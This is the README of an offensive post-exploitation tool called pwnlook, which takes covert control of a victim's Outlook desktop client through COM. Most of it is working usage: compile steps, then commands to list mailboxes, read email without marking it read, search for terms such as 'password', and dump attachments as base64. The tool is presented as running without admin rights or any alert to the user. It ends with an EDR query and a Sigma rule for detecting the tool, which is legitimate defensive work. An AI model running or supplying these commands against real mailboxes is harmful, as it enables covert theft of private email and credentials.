# pwnlook
Pwnlook is an offensive postexploitation tool that will give you complete control over the Outlook desktop application and therefore to the emails configured in it.
What it does:
- List mailboxes
- List folders
- Gather emails information
- Read email
- Search by recipient or subject
- Download attachments

It's possible to do almost everything that Outlook can do: send emails, create forward rules, list contacts... But all this is out of the scope of this project. **At the end of the this `README` you will find some detection techniques**.

Pwnlook is written in .NET 4.8.1

## Compile
To compile it you need first to register both DLLs. This is only for compilation, there is no need to register the DLL where you execute it:
```
regsvr32.exe .\Redemption.dll
regsvr32.exe .\Redemption64.dll
```

You can unregister them later:
```
regsvr32.exe -u .\Redemption.dll
regsvr32.exe -u .\Redemption64.dll
```
Open the `.sln` with Visual Studio and compile it. 

Then use [ILMerge](https://github.com/dotnet/ILMerge) to create a single binary:
```
.\ILMerge.exe /target:pwnlook481.exe /out:pwnlook.exe pwnlook481.exe Newtonsoft.Json.dll
```

## How it works
`pwnlook` communicates with Outlook via COM. By using the [Redemption library](https://www.dimastr.com/redemption/home.htm) it can gather all kind of information without triggering any alert to the user, even if you read an unread email the email will keep as unread for the user.

The tool comes with some limitations that are related with the, most likely, possibility of dealing with very big OST files. Thats why, for example, I didn't implement an option to "list all emails".

The `Redemption64.dll` must be in the same path as the `pwnlook.exe`. There is no need to register the DLL ([Registry free COM](https://www.dimastr.com/redemption/security.htm#redemptionloader)) so you can run it on behalf of any user, even if it isn't Local Admin.

```powershell
.\pwnlook.exe --help


                    .__                 __
________  _  ______ |  |   ____   ____ |  | __
\____ \ \/ \/ /    \|  |  /  _ \ /  _ \|  |/ /
|  |_> >     /   |  \  |_(  <_> |  <_> )    <
|   __/ \/\_/|___|  /____/\____/ \____/|__|_ \
|__|              \/                        \/


Usage: pwnlook.exe [options]

List mailboxes:
  -listmailboxes

List folders:
  -mailbox <mailbox> -listfolders

List emails from date:
  -mailbox <mailbox> -folder <Folder\Path> -date <yyyy-MM-dd>

List latest X emails from folder:
  -mailbox <mailbox> -folder <Folder\Path> -latest <X>

Read email:
  -mailbox <mailbox> -folder <Folder\Path> -id <ID>

Download attachment (base64):
  -mailbox <mailbox> -folder <Folder\Path> -id <ID> -attachment <X>

Search by sender or subject:
  -mailbox <mailbox> -folder <Folder\Path> -search <sender|subject> -value <string>

Result format in JSON
  -json

Examples:
.\pwnlook.exe -mailbox my@mail.com -folder "Inbox" -latest 20 -json        Lists latest 20 emails from Inbox
```

### List Mailboxes
First you must list the existing mailboxes `.\pwnlook.exe -listmailboxes`:
```
Available Mailboxes:
    - test_1@domaintest.tld
    - test_2@domaintest.tld
```

### List existing folders
`.\pwnlook.exe -mailbox "test_1@domaintest.tld" -listfolders`

```
IPM_SUBTREE
    Trash
    Inbox
        test1
    Outbox
    Sent
    Calendar (This computer only)
    Contacts (This computer only)
    Journal (This computer only)
    Notes (This computer only)
    Tasks (This computer only)
    Drafts
    RSS Feeds
    Conversation Action Settings (This computer only)
    Quick Step Settings (This computer only)
    Sync Issues (This computer only)
        Local Failures (This computer only)
    Junk
    Archive
    test2
```

### Examples
**List latest 3 emails from test1 folder**
```
.\pwnlook.exe -mailbox "test_1@domaintest.tld" -folder "Inbox\test1" -latest 3 -json
```

Output example in JSON:
```
  {
    "Sender": "aaaa@eeee.org",
    "Recipients": "test_1@domaintest.tld",
    "Subject": "Email1",
    "Body": null,
    "Attachments": [],
    "Date": "2024-08-21",
    "Folder": "test1",
    "ID": "0000000057C2BFB33842564EBEE8060D4BBE7C4A0700FCDA005631565E4A933C1CF9DF307DD500000000000F0000D9539C2261A6BB45B9DAB62C7081B3C101000D0000000000"
  }
```

**List emails from date**
```
.\pwnlook.exe -mailbox test_1@domaintest.tld -folder "Inbox" -date "2024-08-12" -json
```
**Search email**
```
.\pwnlook.exe -mailbox test_1@domaintest.tld -folder "Inbox" -search "sender" -value "boss" -json
```

```
.\pwnlook.exe -mailbox test_1@domaintest.tld -folder "Inbox" -search "subjet" -value "password" -json
```

**Read email**

Use the `ID` to read the email:
```
.\pwnlook.exe -mailbox test_1@domaintest.tld -folder "test2" -read "0000000057C2BFB33842564EBEE8060D4BBE7C4A0700FCDA005631565E4A933C1CF9DF307DD50000000000110000FCDA005631565E4A933C1CF9DF307DD50000000016000000" -json
```

```
{
  "Sender": "aaaa@eeee.org",
  "Recipients": "test_1@domaintest.tld",
  "Subject": "Re: testeando",
  "Body": "Ok a todo\r\n\r\n\r\nEl 12 de agosto de 2024 11:30:25 CEST, test_1@domaintest.tld escribió:\r\n\r\n\temail de prueba\r\n\r\n",
  "Attachments": [
    "Senior Security Analyst - Job Description.pdf"
  ],
  "Date": "2024-08-12",
  "Folder": "test2",
  "ID": "0000000057C2BFB33842564EBEE8060D4BBE7C4A0700FCDA005631565E4A933C1CF9DF307DD50000000000110000FCDA005631565E4A933C1CF9DF307DD50000000016000000"
}
```

**Download attachment**
```
.\pwnlook.exe -mailbox test_1@domaintest.tld -folder "test2" -read "0000000057C2BFB33842564EBEE8060D4BBE7C4A0700FCDA005631565E4A933C1CF9DF307DD50000000000110000FCDA005631565E4A933C1CF9DF307DD50000000016000000" -attachment 0 > base64.txt
```

The attachment is encoded in `base64`, you can dump it as a file with Powershell like:
```
[System.IO.File]::WriteAllBytes("outputFile.pdf", [System.Convert]::FromBase64String([System.IO.File]::ReadAllText("base64.txt")))
```

## Detect

In your EDR you can search for unsigned processes accessing `OST` files.

In Cortex XDR would be like:

```
config case_sensitive = false
| preset = xdr_file 
| filter event_sub_type = ENUM.FILE_OPEN 
| filter action_file_path ~= "C:\\Users\\.*\\AppData\\Local\\Microsoft\\Outlook\\.*\.ost$" and actor_process_signature_status = UNSIGNED
| fields _time, agent_hostname , actor_effective_username , action_file_path, actor_process_image_name , actor_process_command_line, actor_process_image_sha256  , actor_process_signature_status , actor_process_signature_vendor 
```

Sigma rule:
```yml
title: Access to OST files by uncommon process
id: 0ea56b07-0bc6-4c8b-8b8a-e32de0557a5e
status: experimental
description: |
    Detects malicious software reading emails directly from OST files.
references:
    - https://github.com/amjcyb/pwnlook
author: amjcyb
date: 2024-09-10
tags:
    - attack.collection
    - attack.t1114.001
logsource:
    category: file_access
    product: windows
    definition: 'Requirements: Microsoft-Windows-Kernel-File ETW provider'
detection:
    selection:
        FileName|endswith: '.ost'
        FileName|contains:
            - 'AppData\Local\Microsoft\Outlook'
    filter_system_folders:
        Image|startswith:
            - 'C:\Program Files\'
            - 'C:\Program Files (x86)\'
            - 'C:\Windows\system32\'
            - 'C:\Windows\SysWOW64\'
    condition: selection and not 1 of filter_*
falsepositives:
    - Other email software
level: high
```

